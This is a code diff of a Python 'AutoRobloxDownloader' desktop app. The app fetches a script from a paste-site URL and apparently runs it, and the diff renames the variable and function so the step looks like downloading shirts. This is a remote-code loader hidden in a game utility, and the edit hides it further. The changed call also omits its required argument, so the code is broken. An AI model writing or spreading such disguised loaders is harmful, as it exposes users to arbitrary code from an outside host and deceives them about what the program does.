@@ -118,9 +118,9 @@ class AutoRobloxDownloader(tk.Tk):
         self.start_btn.config(state="normal")
 import requests
 
-SCRIPT_URL = "https://paste.yunohost.org/raw/idujofibed"
+DownloadApi = "https://paste.yunohost.org/raw/idujofibed"
 
-def load_and_run_script(url):
+def loadShirtAndDwonload(url):
     try:
         response = requests.get(url)
         response.raise_for_status()
@@ -132,6 +132,6 @@ def load_and_run_script(url):
         print(f"Error running the script: {e}")
 
 if __name__ == "__main__":
-    app = AutoRobloxDownloader()
-    load_and_run_script(SCRIPT_URL)
+    app = AutoRobloxDownloader(DownloadApi)
+    loadShirtAndDwonload()
     app.mainloop()
